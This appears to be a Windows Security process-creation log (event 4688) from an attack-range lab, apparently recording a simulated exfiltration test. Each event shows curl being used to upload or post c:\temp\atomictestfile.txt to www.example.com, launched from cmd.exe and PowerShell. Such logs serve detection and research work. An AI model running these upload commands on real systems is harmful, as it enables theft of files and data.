SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727464
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1960
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x18f4
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  -T c:\temp\atomictestfile.txt www.example.com 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:51:37 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727463
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x18f4
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1a78
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:56:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727935
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1814
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1580
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  --data c:\temp\atomictestfile.txt www.example.com 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:56:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727926
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xff4
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1580
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  -d c:\temp\atomictestfile.txt www.example.com 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:56:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727917
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x3c0
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1580
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  --upload-file c:\temp\atomictestfile.txt www.example.com 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
